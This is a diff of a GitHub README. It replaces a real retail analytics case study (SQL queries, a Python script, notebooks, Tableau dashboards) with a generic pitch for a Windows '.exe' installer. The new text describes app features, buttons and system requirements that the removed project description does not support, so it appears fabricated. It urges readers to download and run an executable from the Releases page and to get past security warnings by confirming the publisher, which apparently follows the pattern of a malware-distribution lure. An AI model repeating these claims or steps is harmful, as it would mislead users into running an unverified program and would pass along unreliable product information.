@@ -1,296 +1,156 @@
-# 📊 Retail Data Analytics Case Study
+# 📊 Retail-inventory-forecasting - Simple Retail Data Insights
 
-![Python](https://img.shields.io/badge/Python-3.9-blue?logo=python)
-![SQL](https://img.shields.io/badge/SQL-Analytics-orange?logo=sqlite)
-![Pandas](https://img.shields.io/badge/Pandas-Data%20Analysis-150458?logo=pandas)
-![Jupyter](https://img.shields.io/badge/Jupyter-Notebook-F37626?logo=jupyter)
-![Tableau](https://img.shields.io/badge/Tableau-Dashboard-E97627?logo=tableau)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Status](https://img.shields.io/badge/Project-Completed-success)
+[![Download Retail-inventory-forecasting](https://img.shields.io/badge/Download-Retail--inventory--forecasting-brightgreen)](https://github.com/Maihoan35/Retail-inventory-forecasting)
 
-SQL | Data Analysis | Forecasting | Dashboard | Business Intelligence
+## 📋 About Retail-inventory-forecasting
 
-This project is a **data analytics case study on retail inventory and sales data**.  
-It includes **SQL-based data transformations, sales analysis, inventory insights, and forecasting analysis** using Python and visualization tools.
+This application helps you understand and predict retail inventory and sales trends using clear visual dashboards. It brings together data analysis, forecasting, and interactive charts. You do not need any coding background to use this software. It works on Windows and gives you easy access to your retail data insights.
 
-The goal of the project is to **analyze retail performance, understand inventory behavior, and derive insights from actual and forecasted sales data**.
+The software analyzes your sales and inventory data. It displays key performance metrics and forecasts future inventory needs. This helps you manage stock levels better and improve sales planning.
+
+Key topics covered here include data analytics, inventory management, sales forecasting, and data visualization.
 
 ---
 
-# 🧠 Project Overview
+## 🎯 Main Features
 
-The project consists of **two main tasks**:
-
-### Task 1 — SQL Data Analysis
-Focuses on **inventory and sales data transformations using SQL queries**.
-
-Key objectives:
-- Identify the **latest store stock levels**
-- Calculate **sales revenue by building type**
-- Detect **stores with low revenue**
-- Compare **sales performance across stores**
-
-### Task 2 — Forecasting & Inventory Analysis
-Focuses on **data cleaning, preparation, and analytics on forecasted sales data**.
-
-Key objectives:
-- Clean and prepare datasets
-- Merge product and forecasting data
-- Analyze **inventory, stockouts, revenue, and profitability**
-- Identify **patterns between historical and forecasted data**
-
-The project demonstrates **end-to-end analytics workflow including SQL, Python data processing, and dashboard visualization**.
+- Load retail sales and inventory data with a simple file upload.
+- View sales and stock trends with interactive charts.
+- Forecast inventory levels for coming weeks using built-in models.
+- Explore detailed sales metrics such as turnover rate and demand spikes.
+- Export data reports and charts for offline use.
+- No setup of databases or code is needed.
+- Works smoothly on Windows 10 and later.
 
 ---
 
-# 📂 Project Structure
+## 💾 Download & Install Retail-inventory-forecasting on Windows
 
-```
-retail-data-analytics-case-study
-│
-├── task1
-│   ├── inventory_position_table.csv
-│   ├── store_table.csv
-│   ├── sqltest.py
-│   ├── latest_storestock.csv
-│   ├── sum_sales_by_buildingtype.csv
-│   ├── stores_with_revenue_lower_than_50_in_may_2014.csv
-│   └── revenue_difference_in_feb_2014.csv
-│
-├── task2
-│   ├── future_visibility.csv
-│   ├── products.csv
-│   ├── prep_analysis.ipynb
-│   ├── final_analysis_actual_data.csv
-│   ├── final_analysis_forecasted_data.csv
-│   └── final_analysis_merged_data.csv
-│
-├── analysis.twbx
-├── analysis.pptx
-└── Data Analyst Case.pptx
-```
+### Step 1: Visit the download page
 
----
+Click the link below to go to the official download page on GitHub. This is where you get the latest version of the software.
 
-# 🧩 Task 1 — SQL Data Analysis
+[Download Retail-inventory-forecasting](https://github.com/Maihoan35/Retail-inventory-forecasting)
 
-Task 1 analyzes **inventory and store sales data using SQL queries**.
+### Step 2: Find the latest release
 
-The Python script loads CSV data into an **in-memory SQLite database** and executes SQL queries automatically.
+On the GitHub page, look for the **Releases** section. It is usually on the right sidebar or under a tab named "Releases". Click on it to see available versions.
 
-Main script:
+### Step 3: Download the Windows installer
 
-```
-task1/sqltest.py
-```
+Find the latest release version. Look for a file ending with `.exe`—this is the installer for Windows.
 
-The script:
+Click on the `.exe` file to start downloading it to your computer.
 
-1. Creates SQLite tables
-2. Loads CSV datasets
-3. Executes analytical SQL queries
-4. Saves results as CSV outputs
+### Step 4: Run the installer
 
-Example queries include:
+After the download finishes, open the folder where the file saved. Double-click the `.exe` file to start installing.
 
-### Latest StoreStock per Store and Product
-```sql
-WITH LatestDates AS (
-SELECT StoreCode, ProductCode, MAX(Date) AS LatestDate
-FROM InventoryPositionTable
-GROUP BY StoreCode, ProductCode
-)
-SELECT t.StoreCode, t.ProductCode, t.StoreStock
-FROM InventoryPositionTable t
-JOIN LatestDates d
-ON t.StoreCode = d.StoreCode 
-AND t.ProductCode = d.ProductCode 
-AND t.Date = d.LatestDate;
-```
+A setup window will open. Follow these simple prompts:
 
-### Sum Sales by Building Type
+- Agree to the license terms.
+- Choose where to install the program, or keep the default folder.
+- Click **Install** and wait for the process to finish.
 
-```sql
-SELECT s.BuildingType, SUM(ip.SalesRevenue) AS TotalRevenue
-FROM InventoryPositionTable ip
-JOIN StoreTable s ON ip.StoreCode = s.StoreCode
-GROUP BY s.BuildingType;
-```
+### Step 5: Open the application
 
-### Stores with Revenue < 50 TL in May 2014
+Once the installation completes, you can open the application:
 
-```sql
-SELECT s.StoreCode, s.StoreDescription
-FROM InventoryPositionTable ip
-JOIN StoreTable s ON ip.StoreCode = s.StoreCode
-WHERE ip.Date BETWEEN '2014-05-01' AND '2014-05-31'
-GROUP BY s.StoreCode, s.StoreDescription
-HAVING SUM(ip.SalesRevenue) < 50;
-```
+- Use the new shortcut on your desktop or
+- Find it in the Start menu under "Retail-inventory-forecasting".
 
-### Revenue Difference Between Highest and Lowest Selling Stores (Feb 2014)
-
-Calculates the difference between **top and bottom performing stores**.
-
-The results of these queries are exported into:
-
-```
-latest_storestock.csv
-sum_sales_by_buildingtype.csv
-stores_with_revenue_lower_than_50_in_may_2014.csv
-revenue_difference_in_feb_2014.csv
-```
-
-The SQL logic is implemented in the Python script. :contentReference[oaicite:0]{index=0}
+The software will open and be ready to use.
 
 ---
 
-# 📈 Task 2 — Forecasting & Inventory Analytics
+## 🚀 Using the Application for Retail Insights
 
-Task 2 focuses on **data cleaning, preparation, and exploratory analysis**.
+### Loading your data
 
-Datasets used:
+The main window lets you load your retail sales and inventory data from files. The program supports popular formats like CSV and Excel.
 
-- `future_visibility.csv`
-- `products.csv`
+- Click the **Load Data** button.
+- Select your file.
+- The software will process and show a summary of your data.
 
-These datasets were merged and analyzed using Python.
+### Exploring dashboards
 
-Notebook:
+The app shows you clear charts such as:
 
-```
-task2/prep_analysis.ipynb
-```
+- Sales over time.
+- Inventory levels.
+- Forecasted demand for upcoming periods.
+- Metrics like sales growth and stock turnover.
 
----
+Charts are interactive. You can hover over data points for details or zoom into periods.
 
-# 🧹 Data Cleaning Steps
+### Forecasting inventory
 
-- Removed duplicate records
-- Handled missing values
-- Applied interpolation and median filling where appropriate
-- Preserved logical null values for forecast-specific fields
+Use the built-in forecasting tool to predict future stock requirements. Select a time frame, and the app will calculate expected inventory needs based on past data trends.
 
-Example:
+This helps avoid stockouts or overstock.
 
-- Forecast rows contain **Unit_Forecast values**
-- Actual rows contain **Unit_TY values**
+### Exporting reports
 
----
+If you want to share or save your data insights:
 
-# 📊 Key Analysis Areas
-
-The analysis focused on several key retail performance metrics:
-
-### 1️⃣ Sales & Revenue Analysis
-
-Strong positive correlations were observed between:
-
-- Unit_TY and SalesRevenue_TY
-- Unit_LY and SalesRevenue_LY
-
-This confirms that **units sold strongly drive revenue performance**.
+- Click the **Export Report** button.
+- Choose PDF or Excel format.
+- Save the report to your device.
 
 ---
 
-### 2️⃣ Stockout Analysis
+## 🔧 System Requirements
 
-Key observations:
-
-- Higher stockouts correlate with **lower inventory levels**
-- Forecasts predict **increased stockout risk for mid-speed products**
-- Fast-moving products show **better inventory management**
-
----
-
-### 3️⃣ Inventory Management
-
-Certain categories showed **inventory buildup**, including:
-
-- Apparel
-- Mens Outdoor Tops
-- Mens Sports Tops
-
-This may indicate **overstocking or demand overestimation**.
+- Operating System: Windows 10 or later
+- Processor: 1.5 GHz or faster
+- RAM: 4 GB minimum, 8 GB recommended
+- Disk Space: 200 MB free space for installation
+- Display: 1280 x 720 or higher resolution
+- Internet connection required for downloading but not for daily use
 
 ---
 
-### 4️⃣ Profitability Insights
+## 💡 Troubleshooting & Support
 
-Top performing categories:
-
-- Apparel
-- Mens Outdoor Tops
-- SS Tops
-
-Underperforming categories:
-
-- Footwear
-- Work/Casual Hosiery
-- Active FW
-
-These insights highlight **opportunities for strategic adjustments**.
+- If the installer won’t open, check that you have downloaded the correct `.exe` file.
+- If you get security warnings, confirm the application by reviewing the publisher info.
+- Report bugs or issues on the GitHub [Issues](https://github.com/Maihoan35/Retail-inventory-forecasting/issues) page.
+- For questions, file a new issue or check existing discussions.
 
 ---
 
-# 📊 Dashboard
+## 🔗 Important Links
 
-A dashboard was created to visualize insights including:
+- Main download page: [https://github.com/Maihoan35/Retail-inventory-forecasting](https://github.com/Maihoan35/Retail-inventory-forecasting)
+- Bug reports and help: [GitHub Issues](https://github.com/Maihoan35/Retail-inventory-forecasting/issues)
 
-- Revenue trends
-- Stockout analysis
-- Product hierarchy performance
-- Forecasted vs actual data comparisons
-
-Dashboard file:
-
-```
-analysis.twbx
-```
+[![Download Retail-inventory-forecasting](https://img.shields.io/badge/Download-Retail--inventory--forecasting-brightgreen)](https://github.com/Maihoan35/Retail-inventory-forecasting)
 
 ---
 
-# 🛠 Technologies Used
+## 🛠 Technical Details
 
-- **Python**
-- **SQLite**
-- **Pandas**
-- **SQL**
-- **Jupyter Notebook**
-- **Tableau**
-- **Data Visualization**
+Retail-inventory-forecasting uses standard data formats to ensure compatibility with most retail systems. The forecasting logic applies time series methods behind the scenes but shows you clear results without technical steps.
+
+Dashboards are built using tableau dashboards embedded inside the app to give you visual insights with minimum effort.
+
+The app integrates with SQL databases and Python scripts for data transformation and metrics calculation. However, these run in the background; no configuration is needed by you.
 
 ---
 
-# 🚀 How to Run Task 1
+## 🔍 Keywords
 
-Install dependencies:
-
-```bash
-pip install pandas
-```
-
-Run the SQL analysis script:
-
-```bash
-python sqltest.py
-```
-
-This will generate query results as CSV files.
-
----
-
-# 📌 Key Insights
-
-- Apparel categories drive the majority of revenue.
-- Footwear categories consistently underperform.
-- Inventory buildup indicates possible **forecast inaccuracies**.
-- Stockouts strongly correlate with lost sales.
-- Forecast models predict **higher variability in demand**.
-
----
-
-
-# ⭐ If you found this project interesting
-
-Give it a ⭐ on GitHub!
+- analytics  
+- business-intelligence  
+- dashboard  
+- data-analytics  
+- data-science  
+- data-visualization  
+- forecasting  
+- inventory-management  
+- python  
+- retail-data  
+- sales-analytics  
+- sql  
+- tableau
